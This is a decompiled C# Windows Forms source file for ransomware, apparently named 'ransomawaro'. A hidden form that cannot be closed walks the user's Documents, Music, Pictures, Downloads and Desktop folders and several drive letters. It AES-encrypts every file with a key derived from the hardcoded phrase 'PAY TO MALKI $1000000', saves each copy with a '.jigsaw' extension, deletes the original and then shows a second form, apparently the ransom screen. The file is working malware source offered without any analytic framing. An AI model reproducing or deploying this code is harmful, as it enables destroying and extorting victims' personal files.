using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using ransomawaro.My;

namespace ransomawaro;

[DesignerGenerated]
public class Form1 : Form
{
	public enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("pbstatus")]
	private ProgressBar _pbstatus;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private string filenamez;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private FileStream fsOutput;

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ProgressBar pbstatus
	{
		[DebuggerNonUserCode]
		get
		{
			return _pbstatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_pbstatus = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		ProgressBar1 = new ProgressBar();
		pbstatus = new ProgressBar();
		ListBox1 = new ListBox();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		ProgressBar progressBar = ProgressBar1;
		Point location = new Point(40, 12);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		Size size = new Size(10, 10);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(3);
		((Control)ProgressBar1).set_Visible(false);
		ProgressBar obj = pbstatus;
		location = new Point(24, 12);
		((Control)obj).set_Location(location);
		((Control)pbstatus).set_Name("pbstatus");
		ProgressBar obj2 = pbstatus;
		size = new Size(10, 10);
		((Control)obj2).set_Size(size);
		((Control)pbstatus).set_TabIndex(4);
		((Control)pbstatus).set_Visible(false);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(24, 28);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(10, 4);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(5);
		((Control)ListBox1).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)pbstatus);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).set_Cursor(Cursors.get_AppStarting());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ShowCursor(int lShow);

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).Close();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), (SearchOption)2, new string[0]))
			{
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
				{
					if (!file.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file);
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments()))
			{
				if (!file2.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file2);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic(), (SearchOption)2, new string[0]))
			{
				foreach (string file3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory2))
				{
					if (!file3.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file3);
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic()))
			{
				if (!file4.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file4);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures(), (SearchOption)2, new string[0]))
			{
				foreach (string file5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory3))
				{
					if (!file5.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file5);
					}
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures()))
			{
				if (!file6.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file6);
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", (SearchOption)2, new string[0]))
			{
				foreach (string file7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory4))
				{
					if (!file7.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file7);
					}
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads"))
			{
				if (!file8.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file8);
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Desktop", (SearchOption)2, new string[0]))
			{
				foreach (string file9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory5))
				{
					if (!file9.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file9);
					}
				}
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop"))
			{
				if (!file10.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file10);
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory6))
				{
					if (!file11.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file11);
					}
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("D:\\"))
			{
				if (!file12.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file12);
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory7))
				{
					if (!file13.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file13);
					}
				}
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("E:\\"))
			{
				if (!file14.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file14);
				}
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory8))
				{
					if (!file15.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file15);
					}
				}
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("A:\\"))
			{
				if (!file16.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file16);
				}
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory9))
				{
					if (!file17.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file17);
					}
				}
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("Z:\\"))
			{
				if (!file18.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file18);
				}
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory10))
				{
					if (!file19.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file19);
					}
				}
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("X:\\"))
			{
				if (!file20.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file20);
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			int num = 0;
			while (true)
			{
				int num2 = num;
				int num3 = upperBound2;
				if (num2 > num3)
				{
					break;
				}
				array2[num] = (byte)Strings.Asc(array[num]);
				num++;
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num4 = 0;
			int num5;
			do
			{
				array4[num4] = array3[num4];
				num4++;
				num5 = num4;
				int num3 = 31;
			}
			while (num5 <= 31);
			return array4;
		}
	}

	public byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			int num = 0;
			while (true)
			{
				int num2 = num;
				int num3 = upperBound2;
				if (num2 > num3)
				{
					break;
				}
				array2[num] = (byte)Strings.Asc(array[num]);
				num++;
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num4 = 32;
			int num5;
			do
			{
				array4[num4 - 32] = array3[num4];
				num4++;
				num5 = num4;
				int num3 = 47;
			}
			while (num5 <= 47);
			return array4;
		}
	}

	public void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_01a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
				fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
				fsOutput.SetLength(0L);
				byte[] buffer = new byte[4097];
				long num = 0L;
				long length = fsInput.Length;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				pbstatus.set_Value(0);
				pbstatus.set_Maximum(100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (Direction)
				{
				case CryptoAction.ActionEncrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				case CryptoAction.ActionDecrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				}
				while (num < length)
				{
					int num2 = fsInput.Read(buffer, 0, 4096);
					cryptoStream.Write(buffer, 0, num2);
					num += num2;
					pbstatus.set_Value((int)Math.Round((double)num / (double)length * 100.0));
				}
				cryptoStream.Close();
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionEncrypt)
				{
					FileInfo fileInfo = new FileInfo(strFileToEncrypt);
					fileInfo.Delete();
				}
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo2 = new FileInfo(strFileToDecrypt);
					fileInfo2.Delete();
				}
				string text = "\r\n";
				if (Direction == CryptoAction.ActionEncrypt)
				{
					Interaction.MsgBox((object)("Encryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
				else
				{
					Interaction.MsgBox((object)("Decryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
			}
			catch (Exception projectError) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(projectError);
				return Information.Err().get_Number() == 53;
			}).Invoke())
			{
				Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
				ProjectData.ClearProjectError();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo3 = new FileInfo(filenamez);
					fileInfo3.Delete();
				}
				else
				{
					FileInfo fileInfo4 = new FileInfo(filenamez);
					fileInfo4.Delete();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			((Control)this).Hide();
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_WindowState((FormWindowState)1);
			Timer1.Stop();
			((Control)MyProject.Forms.Form2).Show();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			byte[] bytKey = CreateKey("PAY TO MALKI $1000000");
			byte[] bytIV = CreateIV("PAY TO MALKI $1000000");
			EncryptOrDecryptFile(filenamez, filenamez + ".jigsaw", bytKey, bytIV, CryptoAction.ActionEncrypt);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}
}
